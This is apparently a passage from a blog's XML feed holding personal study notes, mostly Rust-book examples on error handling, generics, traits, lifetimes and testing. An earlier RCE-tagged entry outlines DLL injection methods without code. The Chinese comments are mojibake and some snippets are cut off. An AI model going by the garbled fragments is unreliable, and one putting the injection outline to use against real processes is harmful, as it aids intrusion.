id="Retç›¸å½“äº-Pop-EIP"><a href="#Retç›¸å½“äº-Pop-EIP" class="headerlink" title="Retç›¸å½“äº Pop EIP"></a>Retç›¸å½“äº Pop EIP</h4><hr><h4 id="DLLæ³¨å…¥"><a href="#DLLæ³¨å…¥" class="headerlink" title="DLLæ³¨å…¥"></a>DLLæ³¨å…¥</h4><p>threadProc çº¿ç¨‹åˆ›å»ºå‡½æ•°<br>ç”¨å¥æŸ„æ§åˆ¶ç›¸åº”è¿›ç¨‹<br>ä¸‰ç§æ–¹æ³•ï¼š<br>åˆ›å»ºè¿œç¨‹çº¿ç¨‹<br>é’©å­æ³¨å…¥<br>è®¾ç½®é‡Œå…¨å±€æ³¨å…¥</p><p>SPaCIoS</p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RUSTå­¦ä¹ 4</title>
      <link href="/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/"/>
      <url>/2020/08/14/RUST%E5%AD%A6%E4%B9%A04/</url>
      
        <content type="html"><![CDATA[<h3 id="Result-lt-T-E-gt"><a href="#Result-lt-T-E-gt" class="headerlink" title="Result&lt;T, E&gt;"></a>Result<code>&lt;T, E&gt;</code></h3><p>Rust doesnâ€™t have exceptions. Instead, it has the type<code>Result&lt;T, E&gt;</code> for recoverable errors and the panic! macro that stops execution when the program encounters an unrecoverable error. </p><p>When the <code>panic!</code>macro executes, your program will print a failure message, unwind and clean up the stack, and then quit.<br><a id="more"></a><br>result enum is defined as having two variants<code>, Ok and Err,</code></p><p>The Result&lt;T, E&gt; type has many helper methods defined on it to do various tasks. One of those methods, called <code>unwrap</code>, is a shortcut method that is implemented <code>just like the match</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">"hello.txt"</span>).unwrap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use std::fs::File;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let f = File::open(<span class="string">"hello.txt"</span>).expect(<span class="string">"Failed to open hello.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Propagating Errors<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">let f = File::open(<span class="string">"hello.txt"</span>);</span><br><span class="line"></span><br><span class="line">    let mut f = match f &#123;</span><br><span class="line">        Ok(file) =&gt; file,</span><br><span class="line">        Err(e) =&gt; <span class="keyword">return</span> Err(e),</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p><p>A Shortcut for Propagating Errors: the ? Operator<br>The<code>?</code>placed after a Result value is defined to work in almost the same way as the match expressions </p><p> If the value of the Result is an Ok, the value inside the Ok will get returned from this expression, and the program will continue. If the value is an Err, the Err will be returned from the whole function as if we had used the return keyword so the error value gets propagated to the calling code.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File::open(<span class="string">"hello.txt"</span>)<span class="string">?.</span>read_to_string(&amp;mut s)?;</span><br><span class="line">Ok(s)</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fn read_username_from_file() -&gt; Result&lt;String, io::Error&gt; &#123;</span><br><span class="line">    fs::read_to_string(<span class="string">"hello.txt"</span>)</span><br></pre></td></tr></table></figure><p> If you can ensure by manually inspecting the code that youâ€™ll never have an Err variant, itâ€™s perfectly acceptable to call<code>unwrap.</code> Hereâ€™s an example:</p><h3 id="Generic-æ³›å‹"><a href="#Generic-æ³›å‹" class="headerlink" title="Generic æ³›å‹"></a>Generic æ³›å‹</h3><p>å°†ä»£ç æŠ½å–å‡ºæ¥ï¼Œå‡å°‘é‡å¤ä»£ç <br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;T&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct Point&lt;T, U&gt; &#123; <span class="regexp">//</span>T Uä»£è¡¨ä¸åŒçš„ç±»å‹</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line">fn main() &#123;</span><br><span class="line">    let both_integer = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line">    let both_float = Point &#123; <span class="symbol">x:</span> <span class="number">1.0</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">    let integer_and_float = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">4.0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>where T was filled in with the type std::fs::File when the file was opened successfully and E was filled in with the type std::io::Error when there were problems opening the file.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T&gt; Point&lt;T&gt; &#123;</span><br><span class="line">    fn x(&amp;<span class="keyword">self</span>) -&gt; &amp;T &#123;</span><br><span class="line">        &amp;<span class="keyword">self</span>.x</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"p.x = &#123;&#125;"</span>, p.x());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that we have to declare <code>T just after impl</code>so we can use it to specify that weâ€™re implementing methods on the type Point<t>.</t></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">struct Point&lt;T, U&gt; &#123;</span><br><span class="line">    <span class="symbol">x:</span> T,</span><br><span class="line">    <span class="symbol">y:</span> U,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl&lt;T, U&gt; Point&lt;T, U&gt; &#123;</span><br><span class="line">    fn mixup&lt;V, W&gt;(<span class="keyword">self</span>, <span class="symbol">other:</span> Point&lt;V, W&gt;) -&gt; Point&lt;T, W&gt; &#123;</span><br><span class="line">        Point &#123;</span><br><span class="line">            <span class="symbol">x:</span> <span class="keyword">self</span>.x,</span><br><span class="line">            <span class="symbol">y:</span> other.y,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let p1 = Point &#123; <span class="symbol">x:</span> <span class="number">5</span>, <span class="symbol">y:</span> <span class="number">10.4</span> &#125;;</span><br><span class="line">    let p2 = Point &#123; <span class="symbol">x:</span> <span class="string">"Hello"</span>, <span class="symbol">y:</span> <span class="string">'c'</span> &#125;;</span><br><span class="line"></span><br><span class="line">    let p3 = p1.mixup(p2);</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"p3.x = &#123;&#125;, p3.y = &#123;&#125;"</span>, p3.x, p3.y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="traits"><a href="#traits" class="headerlink" title="traits"></a>traits</h3><p>Different types share the same behavior if we can call the same methods on all of those types. Trait definitions are a way to group method signatures together to define a set of behaviors necessary to accomplish some purpose.</p><p>Each type implementing this trait must provide<code>its own custom behavior</code>for the body of the method.<br><code>ç›¸å½“äºæä¾›ä¸€ä¸ªæ¥å£ï¼Œå…·ä½“å†…å®¹è‡ªå·±å®ç°</code><br>ä¸Javaä¸€ä¸ªæ¦‚å¿µç±»ä¼¼</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123; <span class="regexp">//</span>æ·»åŠ traitåˆ°ç»“æ„ä¸­</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;, by &#123;&#125; (&#123;&#125;)"</span>, <span class="keyword">self</span>.headline, <span class="keyword">self</span>.author, <span class="keyword">self</span>.location)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;: &#123;&#125;"</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that because we defined the Summary trait and the NewsArticle and Tweet types in the same lib.rs in Listing 10-13, theyâ€™re all in the same scope. Letâ€™s say this lib.rs is for a crate weâ€™ve called aggregator and someone else wants to use our crateâ€™s functionality to implement the Summary trait on a struct defined within their libraryâ€™s scope. They would need to bring the trait into their scope first. They would do so by specifying use <code>aggregator::Summary;</code>, which then would enable them to implement Summary for their type. The Summary trait would also need to be a public trait for another crate to implement it, which it is because we put the pub keyword before trait in Listing 10-12.</p><p>with trait implementations is that we can<code>implement a trait on a type only if either the trait or the type is local to our crate</code><br><code>canâ€™t implement external traits on external types.</code></p><p>as we implement the trait on a particular type, we can keep or override each methodâ€™s default behavior.<br>specify an empty impl block with impl Summary for NewsArticle {}.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">pub trait Summary &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        String::from(<span class="string">"(Read more...)"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pub struct NewsArticle &#123;</span><br><span class="line">    pub <span class="symbol">headline:</span> String,</span><br><span class="line">    pub <span class="symbol">location:</span> String,</span><br><span class="line">    pub <span class="symbol">author:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> NewsArticle &#123;&#125;</span><br><span class="line"></span><br><span class="line">pub struct Tweet &#123;</span><br><span class="line">    pub <span class="symbol">username:</span> String,</span><br><span class="line">    pub <span class="symbol">content:</span> String,</span><br><span class="line">    pub <span class="symbol">reply:</span> bool,</span><br><span class="line">    pub <span class="symbol">retweet:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Summary <span class="keyword">for</span> Tweet &#123;</span><br><span class="line">    fn summarize(&amp;<span class="keyword">self</span>) -&gt; String &#123;</span><br><span class="line">        format!(<span class="string">"&#123;&#125;: &#123;&#125;"</span>, <span class="keyword">self</span>.username, <span class="keyword">self</span>.content)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Default implementations can call other methods in the same trait, even if those other methods donâ€™t have a default implementation.</p><p>![allow(unused_variables)]<br>fn main() {<br>pub trait Summary {<br>    fn summarize_author(&amp;self) -&gt; String;</p><pre><code>fn summarize(&amp;self) -&gt; String {    format!(&quot;(Read more from {}...)&quot;, self.summarize_author())}</code></pre><p>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize_author(&amp;self) -&gt; String {<br>        format!(â€œ@{}â€, self.username)<br>    }<br>}<br>}</p><p>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}, by {} ({})â€, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}: {}â€, self.username, self.content)<br>    }<br>}</p><p>pub fn notify(item: &amp;impl Summary) {<br>    println!(â€œBreaking news! {}â€, item.summarize());<br>}</p><h3 id="bound-trait"><a href="#bound-trait" class="headerlink" title="bound trait"></a>bound trait</h3><p>pub fn notify&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) {<br>ä¼ å…¥çš„ç±»å‹å¿…é¡»ç›¸åŒ</p><pre><code>pub fn notify(item: &amp;(impl Summary + Display)) {pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) {fn some_function&lt;T, U&gt;(t: &amp;T, u: &amp;U) -&gt; i32    where T: Display + Clone,          U: Clone + Debug{</code></pre><p>an also use the impl Trait syntax in the return position to return a value of some type that implements a trait,<br>pub trait Summary {<br>    fn summarize(&amp;self) -&gt; String;<br>}</p><p>pub struct NewsArticle {<br>    pub headline: String,<br>    pub location: String,<br>    pub author: String,<br>    pub content: String,<br>}</p><p>impl Summary for NewsArticle {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}, by {} ({})â€, self.headline, self.author, self.location)<br>    }<br>}</p><p>pub struct Tweet {<br>    pub username: String,<br>    pub content: String,<br>    pub reply: bool,<br>    pub retweet: bool,<br>}</p><p>impl Summary for Tweet {<br>    fn summarize(&amp;self) -&gt; String {<br>        format!(â€œ{}: {}â€, self.username, self.content)<br>    }<br>}</p><p>fn returns_summarizable() -&gt; <code>impl Summary {</code><br>    Tweet {<br>        username: String::from(â€œhorse_ebooksâ€),<br>        content: String::from(<br>            â€œof course, as you probably already know, peopleâ€,<br>        ),<br>        reply: false,<br>        retweet: false,<br>    }<br>}</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn largest&lt;<span class="symbol">T:</span> PartialOrd + Copy&gt;(<span class="symbol">list:</span> &amp;[T]) -&gt; T &#123; <span class="regexp">//</span>é™åˆ¶åªèƒ½ä¼ è¿›i32 charç­‰</span><br><span class="line">    let mut largest = list[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &amp;item <span class="keyword">in</span> list &#123;</span><br><span class="line">        <span class="keyword">if</span> item &gt; largest &#123;</span><br><span class="line">            largest = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    largest</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fn main() {<br>    let number_list = vec![34, 50, 25, 100, 65];</p><pre><code>let result = largest(&amp;number_list);println!(&quot;The largest number is {}&quot;, result);let char_list = vec![&apos;y&apos;, &apos;m&apos;, &apos;a&apos;, &apos;q&apos;];let result = largest(&amp;char_list);println!(&quot;The largest char is {}&quot;, result);</code></pre><p>}</p><p>impl&lt;T: Display&gt; ToString for T {<br>    // â€“snipâ€“<br>}</p><h3 id="The-Borrow-Checker"><a href="#The-Borrow-Checker" class="headerlink" title="The Borrow Checker"></a>The Borrow Checker</h3><p>weâ€™ll add generic lifetime parameters that define the relationship between the references </p><p>lifetime<br>Lifetime annotations <code>donâ€™t change</code> how long any of the references live. </p><pre><code>&amp;i32        // a reference&amp;&apos;a i32     // a reference with an explicit lifetime&amp;&apos;a mut i32 // a mutable reference with an explicit lifetime</code></pre><p>have a function with the parameter first that is a reference to an i32 with lifetime â€˜a. The function also has another parameter named second that is another reference to an i32 that also has the lifetime â€˜a. The lifetime annotations indicate that the references first and second must both live as long as that generic lifetime.</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let string1 = String::from(<span class="string">"abcd"</span>);</span><br><span class="line">    let string2 = <span class="string">"xyz"</span>;</span><br><span class="line"></span><br><span class="line">    let result = longest(string1.as_str(), string2);</span><br><span class="line">    println!(<span class="string">"The longest string is &#123;&#125;"</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn longest&lt;<span class="string">'a&gt;(x: &amp;'</span>a str, <span class="symbol">y:</span> &amp;<span class="string">'a str) -&gt; &amp;'</span>a str &#123;</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>è¿”å›çš„å¼•ç”¨å–æœ€çŸ­çš„lifetime</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct ImportantExcerpt&lt;<span class="string">'a&gt; &#123;</span></span><br><span class="line"><span class="string">    part: &amp;'</span>a str,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let novel = String::from(<span class="string">"Call me Ishmael. Some years ago..."</span>);</span><br><span class="line">    let first_sentence = novel.split(<span class="string">'.'</span>).<span class="keyword">next</span>().expect(<span class="string">"Could not find a '.'"</span>);</span><br><span class="line">    let i = ImportantExcerpt &#123;</span><br><span class="line">        <span class="symbol">part:</span> first_sentence,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>an instance of ImportantExcerpt canâ€™t <code>outlive the reference it</code><br>holds in its part field.</p><h3 id="Lifetime-Elision"><a href="#Lifetime-Elision" class="headerlink" title="Lifetime Elision"></a>Lifetime Elision</h3><p>ç”±ç¼–è¯‘å™¨è¿›è¡Œå¼•ç”¨lifetimeçš„ç¼–å†™<br>ä¸‰ä¸ªé˜¶æ®µ</p><h4 id="The-Static-Lifetime"><a href="#The-Static-Lifetime" class="headerlink" title="The Static Lifetime"></a>The Static Lifetime</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#![allow(unused_variables)]</span></span><br><span class="line">fn main() &#123;</span><br><span class="line">let <span class="symbol">s:</span> &amp;<span class="string">'static str = "I have a static lifetime.";</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>means that this reference can live for the entire duration of the program</p><p> lifetimes are a type of generic,<br>fn main() {<br>    let string1 = String::from(â€œabcdâ€);<br>    let string2 = â€œxyzâ€;</p><pre><code>let result = longest_with_an_announcement(    string1.as_str(),    string2,    &quot;Today is someone&apos;s birthday!&quot;,);println!(&quot;The longest string is {}&quot;, result);</code></pre><p>}</p><p>use std::fmt::Display;</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fn longest_with_an_announcement&lt;<span class="string">'a, T&gt;(</span></span><br><span class="line"><span class="string">    x: &amp;'</span>a str,</span><br><span class="line">    <span class="symbol">y:</span> &amp;<span class="string">'a str,</span></span><br><span class="line"><span class="string">    ann: T,</span></span><br><span class="line"><span class="string">) -&gt; &amp;'</span>a str</span><br><span class="line">where</span><br><span class="line">    <span class="symbol">T:</span> Display,</span><br><span class="line">&#123;</span><br><span class="line">    println!(<span class="string">"Announcement! &#123;&#125;"</span>, ann);</span><br><span class="line">    <span class="keyword">if</span> x.len() &gt; y.len() &#123;</span><br><span class="line">        x</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        y</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>cargo test<br>Checking Results with the assert! Macro<br>The <code>assert!</code>macro, provided by the standard library, is useful when you want to ensure that some condition in a test evaluates to true.</p><p><code>assert_eq! and assert_ne!</code>These macros compare two arguments for equality or inequality, respectively. </p><p>should_panic  äº§ç”Ÿpanicè¿”å›æ­£ç¡®<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pub struct Guess &#123;</span><br><span class="line">    <span class="symbol">value:</span> i32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">impl Guess &#123;</span><br><span class="line">    pub fn new(<span class="symbol">value:</span> i32) -&gt; Guess &#123;</span><br><span class="line">        <span class="keyword">if</span> value &lt; <span class="number">1</span> <span class="params">||</span> value &gt; <span class="number">100</span> &#123;</span><br><span class="line">            panic!(<span class="string">"Guess value must be between 1 and 100, got &#123;&#125;."</span>, value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Guess &#123; value &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[cfg(test)]</span></span><br><span class="line">mod tests &#123;</span><br><span class="line">    use super::*;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#[test]</span></span><br><span class="line">    <span class="comment">#[should_panic]</span></span><br><span class="line">    fn greater_than_10<span class="number">0</span>() &#123;</span><br><span class="line">        Guess::new(<span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#[test]</span></span><br><span class="line"><span class="comment">#[should_panic(expected = "Guess value must be less than or equal to 100")]</span></span><br></pre></td></tr></table></figure></p><p>the unit type, ()</p><p>TDD process</p><p>test è¿˜æ˜¯å¾ˆä¸å¤šçš„ï¼ŒC++çš„æ—¶å€™éƒ½ä¸€ééè¾“å…¥å‚æ•°</p><p><code>$ cargo run &gt; output.txt</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> RUST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RUSTå­¦ä¹ 3</title>
      <link href="/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/"/>
      <url>/2020/08/03/RUST%E5%AD%A6%E4%B9%A03/</url>
      
        <content type="html"><![CDATA[<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>The <code>Debug trait</code>enables us to print our struct in a way that is useful for developers so we can see its value while weâ€™re debugging our code.<br><a id="more"></a><br><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[derive(Debug)]  //å¼€å¯ä½¿ç”¨debug :?æ‰“å°ç»“æ„ä½“</span><br><span class="line">struct Rectangle &#123;</span><br><span class="line">    width: u32,</span><br><span class="line">    height: u32,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let rect1 = Rectangle &#123;</span><br><span class="line">        width: <span class="number">30</span>,</span><br><span class="line">        height: <span class="number">50</span>,</span><br><span class="line">    